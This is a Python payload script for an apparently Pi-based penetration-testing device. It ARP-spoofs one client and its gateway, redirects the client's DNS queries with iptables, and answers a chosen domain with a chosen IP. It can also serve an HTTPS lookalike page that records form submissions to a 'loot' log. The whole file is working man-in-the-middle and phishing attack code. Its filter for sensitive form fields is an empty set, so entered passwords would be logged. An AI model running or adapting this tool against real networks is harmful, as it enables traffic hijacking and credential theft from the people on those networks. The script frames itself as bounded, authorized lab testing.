#!/usr/bin/env python3
# @name: Bounded DNS Spoofing Test
# @desc: ARP-redirect one authorized client, answer one exact or wildcard DNS name with a chosen IPv4 address, forward unmatched UDP queries upstream, and save a bounded query log to loot.
# @category: network
# @danger: true
# @active: true
# @web: true
# @maturity: functional
# @inputs: [{"name":"domain","label":"Authorized DNS name to override (exact name or one leading wildcard)","type":"text","placeholder":"portal.example.test or *.example.test","required":true},{"name":"address","label":"IPv4 address returned for matching A-record queries","type":"text","required":true},{"name":"client","label":"Authorized client IPv4 whose DNS traffic will be intercepted","type":"text","required":true},{"name":"gateway","label":"Client network gateway IPv4 used for bounded ARP redirection","type":"text","required":true},{"name":"upstream","label":"Upstream DNS IPv4 used for every unmatched UDP query","type":"text","default":"1.1.1.1"},{"name":"seconds","label":"Maximum interception duration in seconds (10-300)","type":"number","default":"60"}]

"""Bounded, single-client DNS interception for authorized lab testing."""

from __future__ import annotations

import ipaddress
import json
import os
import shutil
import signal
import socket
import ssl
import subprocess
import sys
import threading
import time
import re
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

from scapy.all import DNS, DNSQR, DNSRR

from payloads._iface_helper import list_interfaces
from payloads._web_input import request_input

LOCAL_DNS_PORT = 53535
TEMPLATE_ROOT = Path(__file__).resolve().parents[2] / "templates" / "dns"
stop_event = threading.Event()
event_log_lock = threading.Lock()
FIELD_NAME_RE = re.compile(r"^[a-z][a-z0-9_]{0,39}$")
SENSITIVE_FIELD_PARTS = {}


def normalize_domain(value: str) -> str:
    domain = value.strip().lower().rstrip(".")
    wildcard = domain.startswith("*.")
    base = domain[2:] if wildcard else domain
    if not base or len(base) > 253 or any(
        not label or len(label) > 63 or label.startswith("-") or label.endswith("-")
        or not all(character.isascii() and (character.isalnum() or character == "-") for character in label)
        for label in base.split(".")
    ):
        raise ValueError("domain must be an exact DNS name or a single leading wildcard such as *.example.test")
    return f"*.{base}" if wildcard else base


def domain_matches(query: str, pattern: str) -> bool:
    query = query.lower().rstrip(".")
    if pattern.startswith("*."):
        suffix = pattern[1:]  
        return query.endswith(suffix) and query != pattern[2:]
    return query == pattern


def interface_choices() -> list[dict]:
    choices = []
    for item in list_interfaces("any"):
        state = "connected" if item.get("is_up") else "disconnected"
        address = item.get("ip") or "no IPv4 address"
        kind = "Wi-Fi" if item.get("is_wifi") else "Ethernet"
        choices.append({
            "value": item["name"],
            "label": f"{item['name']} — {kind}, {state}, {address}",
        })
    return choices


def allowed_submission_fields(value) -> list[str]:
    if not isinstance(value, list):
        return []
    fields = []
    for item in value[:12]:
        name = str(item).strip().lower()
        tokens = set(name.split("_"))
        sensitive = any(
            part in tokens or (len(part) >= 5 and part in name)
            for part in SENSITIVE_FIELD_PARTS
        )
        if (FIELD_NAME_RE.fullmatch(name)
                and not sensitive
                and name not in fields):
            fields.append(name)
    return fields


def discover_templates(root: Path = TEMPLATE_ROOT) -> list[dict]:
    """Return safe static-site directories that contain an index page."""
    choices = [{
        "value": "none",
        "label": "DNS only — do not start a web server; the response IP hosts its own service",
        "path": None,
    }]
    if not root.is_dir():
        return choices
    for directory in sorted(root.iterdir()):
        if not directory.is_dir() or directory.is_symlink() or not (directory / "index.html").is_file():
            continue
        if any(path.is_symlink() for path in directory.rglob("*")):
            continue
        metadata = {}
        try:
            metadata = json.loads((directory / "template.json").read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            pass
        name = str(metadata.get("name") or directory.name.replace("-", " ").title())[:80]
        description = str(metadata.get("description") or "serve this local static template")[:180]
        choices.append({
            "value": directory.name,
            "label": f"{name} — {description}",
            "path": directory.resolve(),
            "submission_fields": allowed_submission_fields(metadata.get("submission_fields")),
        })
    return choices


def local_ipv4_addresses() -> set[str]:
    result = subprocess.run(
        ["ip", "-j", "address", "show"], capture_output=True, text=True, timeout=10,
    )
    try:
        interfaces = json.loads(result.stdout or "[]")
    except json.JSONDecodeError:
        return set()
    return {
        str(address.get("local"))
        for interface in interfaces
        for address in interface.get("addr_info", [])
        if address.get("family") == "inet" and address.get("local")
    }


def append_event(log_path: Path, event: dict) -> None:
    with event_log_lock, log_path.open("a", encoding="utf-8") as output:
        output.write(json.dumps(event, ensure_ascii=False) + "\n")


def redirect_handler(fallback_host: str, event_log: Path):
    class RedirectHandler(BaseHTTPRequestHandler):
        def redirect_to_https(self):
            host = self.headers.get("Host", "").split(":", 1)[0].strip().lower()
            if not re.fullmatch(r"[a-z0-9.-]+", host):
                host = fallback_host
            parsed = urlsplit(self.path)
            target = parsed.path or "/"
            if parsed.query:
                target += "?" + parsed.query
            location = f"https://{host}{target}"
            append_event(event_log, {
                "event": "https_redirect",
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "client": self.client_address[0], "method": self.command,
                "path": target, "location": location,
            })
            self.send_response(308)
            self.send_header("Location", location)
            self.send_header("Cache-Control", "no-store")
            self.send_header("Content-Length", "0")
            self.end_headers()

        do_GET = redirect_to_https
        do_HEAD = redirect_to_https
        do_POST = redirect_to_https

        def log_message(self, _fmt, *_args):
            return

    return RedirectHandler


def template_handler(directory: Path, event_log: Path, submission_fields: list[str]):
    allowed_fields = set(submission_fields)

    class Handler(SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=str(directory), **kwargs)

        def guess_type(self, path):
            content_type = super().guess_type(path)
            textual_types = {
                "application/javascript", "application/json",
                "application/xhtml+xml", "application/xml", "image/svg+xml",
            }
            if (
                "charset=" not in content_type.lower()
                and (content_type.startswith("text/") or content_type in textual_types)
            ):
                return f"{content_type}; charset=utf-8"
            return content_type

        def do_POST(self):
            if urlsplit(self.path).path != "/submit":
                self.send_error(404, "Submission endpoint not found")
                return
            if not allowed_fields:
                self.send_error(403, "This template does not accept submissions")
                return
            content_type = self.headers.get("Content-Type", "").split(";", 1)[0].strip().lower()
            try:
                length = int(self.headers.get("Content-Length", "0"))
            except ValueError:
                length = 0
            if content_type != "application/x-www-form-urlencoded" or not 0 < length <= 8192:
                self.send_error(400, "Expected a small URL-encoded form submission")
                return
            try:
                fields = parse_qs(
                    self.rfile.read(length).decode("utf-8", errors="replace"),
                    keep_blank_values=True, max_num_fields=20,
                )
            except ValueError:
                self.send_error(400, "Invalid form submission")
                return
            if not fields or not set(fields).issubset(allowed_fields):
                self.send_error(400, "Something Wrong with fields.")
                return
            cleaned = {
                name: str(values[-1])[:500]
                for name, values in fields.items()
            }
            event = {
                "event": "form_submission",
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "client": self.client_address[0], "fields": cleaned,
            }
            append_event(event_log, event)
            print(
                f"Awareness response from {self.client_address[0]} · fields={list(cleaned)}",
                flush=True,
            )
            self.send_response(303)
            self.send_header("Location", "/thanks.html")
            self.send_header("Cache-Control", "no-store")
            self.end_headers()

        def log_message(self, fmt, *args):
            event = {
                "event": "http_request",
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "client": self.client_address[0], "method": self.command,
                "path": urlsplit(self.path).path, "message": fmt % args,
            }
            append_event(event_log, event)
            print(f"HTTP {self.client_address[0]} · {self.command} {self.path}", flush=True)

    return Handler


def stop_process(process: subprocess.Popen | None) -> None:
    if not process or process.poll() is not None:
        return
    os.killpg(process.pid, signal.SIGTERM)
    try:
        process.wait(timeout=5)
    except subprocess.TimeoutExpired:
        os.killpg(process.pid, signal.SIGKILL)
        process.wait(timeout=2)


def run(command: list[str], check: bool = True) -> subprocess.CompletedProcess:
    result = subprocess.run(command, capture_output=True, text=True, timeout=10)
    if check and result.returncode:
        raise RuntimeError((result.stderr or result.stdout or "command failed").strip())
    return result


def build_spoof_response(query: DNS, domain: str, address: str) -> bytes:
    response = DNS(
        id=query.id, qr=1, aa=1, rd=query.rd, ra=1,
        qd=query.qd, qdcount=1, ancount=1,
        an=DNSRR(rrname=domain + ".", type="A", rclass="IN", ttl=30, rdata=address),
    )
    return bytes(response)


def proxy_query(payload: bytes, upstream: str) -> bytes | None:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as upstream_socket:
        upstream_socket.settimeout(3)
        try:
            upstream_socket.sendto(payload, (upstream, 53))
            response, _ = upstream_socket.recvfrom(65535)
            return response
        except OSError:
            return None


def parse_query(payload: bytes) -> tuple[DNS, str, int]:
    query = DNS(payload)
    question = query.qd[0] if query.qr == 0 and query.qd and isinstance(query.qd[0], DNSQR) else None
    if not question:
        return query, "", 0
    domain = bytes(question.qname).decode("ascii", errors="ignore").rstrip(".").lower()
    return query, domain, int(question.qtype)


def serve_dns(server: socket.socket, pattern: str, address: str, upstream: str,
              log_path: Path, deadline: float) -> tuple[int, int]:
    total = spoofed = 0
    while not stop_event.is_set() and time.monotonic() < deadline:
        server.settimeout(min(1.0, max(0.1, deadline - time.monotonic())))
        try:
            payload, client_address = server.recvfrom(65535)
        except socket.timeout:
            continue
        try:
            query, queried, qtype = parse_query(payload)
        except Exception:
            continue

        total += 1
        matched = bool(queried and qtype in {1, 255} and domain_matches(queried, pattern))
        response = build_spoof_response(query, queried, address) if matched else proxy_query(payload, upstream)
        if response:
            try:
                server.sendto(response, client_address)
            except OSError:
                pass
        if matched:
            spoofed += 1
        event = {
            "event": "dns_query",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "client": client_address[0], "domain": queried,
            "query_type": qtype, "spoofed": matched,
            "answer": address if matched else "upstream",
        }
        append_event(log_path, event)
        result = f"spoofed to {address}" if matched else "forwarded upstream"
        print(f"DNS {client_address[0]} · {queried or '<invalid>'} · {result}", flush=True)
    return total, spoofed


def cleanup_signal(_signum, _frame) -> None:
    stop_event.set()


def main() -> int:
    required_tools = {
        "arpspoof": shutil.which("arpspoof"),
        "iptables": shutil.which("iptables"),
        "ip": shutil.which("ip"),
    }
    for command, resolved in required_tools.items():
        if not resolved:
            print(f"Missing required tool: {command}", flush=True)
            return 127
    try:
        pattern = normalize_domain(sys.argv[1])
        address = str(ipaddress.IPv4Address(sys.argv[2]))
        client = str(ipaddress.IPv4Address(sys.argv[3]))
        gateway = str(ipaddress.IPv4Address(sys.argv[4]))
        upstream = str(ipaddress.IPv4Address(sys.argv[5]))
        seconds = int(sys.argv[6])
    except (IndexError, ValueError) as exc:
        print(f"Invalid DNS spoofing argument: {exc}", flush=True)
        return 2
    if client == gateway or not 10 <= seconds <= 300:
        print("Client and gateway must differ; duration must be 10-300 seconds.", flush=True)
        return 2

    choices = interface_choices()
    if not choices:
        print("No physical network interface was detected.", flush=True)
        return 1
    interface = str(request_input(
        "Interface carrying traffic for the authorized client and gateway",
        input_type="select", choices=choices,
    ))
    if interface not in {choice["value"] for choice in choices}:
        print("The selected interface is no longer available.", flush=True)
        return 1

    templates = discover_templates()
    template_name = str(request_input(
        "Web content to serve when the spoofed name points to this Pi",
        input_type="select",
        choices=[{"value": item["value"], "label": item["label"]} for item in templates],
        default="none",
    ))
    selected_template = next((item for item in templates if item["value"] == template_name), None)
    if not selected_template:
        print("The selected DNS template is no longer available.", flush=True)
        return 1
    template_path = selected_template["path"]
    if template_path and address not in local_ipv4_addresses():
        print(
            f"Template hosting requires the response address to belong to this Pi; {address} is not local.",
            flush=True,
        )
        return 2

    loot = Path(os.environ["CITYPOP_LOOT"]) / "DNSSpoof"
    loot.mkdir(parents=True, exist_ok=True)
    log_path = loot / f"dns_spoof_session_{time.strftime('%Y%m%d_%H%M%S')}.jsonl"
    forwarding = Path("/proc/sys/net/ipv4/ip_forward")
    previous_forwarding = forwarding.read_text(encoding="utf-8").strip()
    redirect = [
        "iptables", "-t", "nat", "-A", "PREROUTING", "-i", interface,
        "-s", client, "-p", "udp", "--dport", "53", "-j", "REDIRECT",
        "--to-ports", str(LOCAL_DNS_PORT),
    ]
    arp_client = arp_gateway = None
    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    http_redirect_server = None
    http_redirect_thread = None
    https_server = None
    https_thread = None
    previous_handlers = {}
    redirect_added = False
    forwarding_changed = False
    stop_event.clear()
    try:
        server.bind(("0.0.0.0", LOCAL_DNS_PORT))
        if template_path:
            handler = template_handler(
                template_path, log_path, selected_template.get("submission_fields", []),
            )
            certfile = Path(os.environ.get(
                "CITYPOP_TLS_CERT", Path(os.environ["CITYPOP_ROOT"]) / "state/tls/cert.pem"
            ))
            keyfile = Path(os.environ.get(
                "CITYPOP_TLS_KEY", Path(os.environ["CITYPOP_ROOT"]) / "state/tls/key.pem"
            ))
            if certfile.is_file() and keyfile.is_file():
                https_server = ThreadingHTTPServer(("0.0.0.0", 443), handler)
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                context.load_cert_chain(certfile, keyfile)
                https_server.socket = context.wrap_socket(
                    https_server.socket, server_side=True,
                )
                https_thread = threading.Thread(
                    target=https_server.serve_forever, daemon=True,
                )
                https_thread.start()
                http_redirect_server = ThreadingHTTPServer(
                    ("0.0.0.0", 80),
                    redirect_handler(pattern.removeprefix("*."), log_path),
                )
                http_redirect_thread = threading.Thread(
                    target=http_redirect_server.serve_forever, daemon=True,
                )
                http_redirect_thread.start()
            else:
                raise RuntimeError(
                    "Template HTTPS requires the City Pop TLS certificate; rerun install.sh"
                )
        for signum in (signal.SIGTERM, signal.SIGINT, signal.SIGHUP):
            previous_handlers[signum] = signal.getsignal(signum)
            signal.signal(signum, cleanup_signal)
        forwarding.write_text("1\n", encoding="utf-8")
        forwarding_changed = True
        run(redirect)
        redirect_added = True
        arp_client = subprocess.Popen(
            ["arpspoof", "-i", interface, "-t", client, gateway],
            stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True,
            start_new_session=True,
        )
        arp_gateway = subprocess.Popen(
            ["arpspoof", "-i", interface, "-t", gateway, client],
            stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True,
            start_new_session=True,
        )
        time.sleep(1)
        for process in (arp_client, arp_gateway):
            if process.poll() is not None:
                detail = process.stderr.read().strip() if process.stderr else ""
                raise RuntimeError(f"arpspoof exited unexpectedly: {detail or process.returncode}")
        print(f"DNS spoof active · Interface: {interface} · Client: {client} · Gateway: {gateway}", flush=True)
        print(f"Rule: {pattern} → {address} · Unmatched UDP DNS → {upstream}", flush=True)
        print(f"Duration: {seconds}s · Unified event log: {log_path}", flush=True)
        if template_path:
            print(f"Template: {selected_template['label']}", flush=True)
            if selected_template.get("submission_fields"):
                print(
                    f"Awareness fields in unified log: {', '.join(selected_template['submission_fields'])}",
                    flush=True,
                )
            if https_server:
                print(
                    f"Hosted page: https://{pattern.removeprefix('*.')}/ · self-signed certificate warning expected",
                    flush=True,
                )
                print("HTTP port 80 redirects matching visitors to HTTPS port 443", flush=True)
        total, spoofed = serve_dns(server, pattern, address, upstream, log_path, time.monotonic() + seconds)
        print(f"DNS spoof stopped · {total} queries · {spoofed} spoofed", flush=True)
        return 0
    except (OSError, RuntimeError, subprocess.SubprocessError) as exc:
        print(f"DNS spoof failed: {exc}", flush=True)
        return 1
    finally:
        stop_event.set()
        server.close()
        if http_redirect_server:
            http_redirect_server.shutdown()
            http_redirect_server.server_close()
        if https_server:
            https_server.shutdown()
            https_server.server_close()
        if https_thread:
            https_thread.join(timeout=3)
        if http_redirect_thread:
            http_redirect_thread.join(timeout=3)
        stop_process(arp_client)
        stop_process(arp_gateway)
        if redirect_added:
            delete_redirect = list(redirect)
            delete_redirect[delete_redirect.index("-A")] = "-D"
            run(delete_redirect, check=False)
        if forwarding_changed:
            try:
                forwarding.write_text(previous_forwarding + "\n", encoding="utf-8")
            except OSError as exc:
                print(f"Warning: could not restore IPv4 forwarding: {exc}", flush=True)
        for signum, handler in previous_handlers.items():
            signal.signal(signum, handler)
        print(f"Cleanup complete · IPv4 forwarding restored to {previous_forwarding}", flush=True)


if __name__ == "__main__":
    raise SystemExit(main())
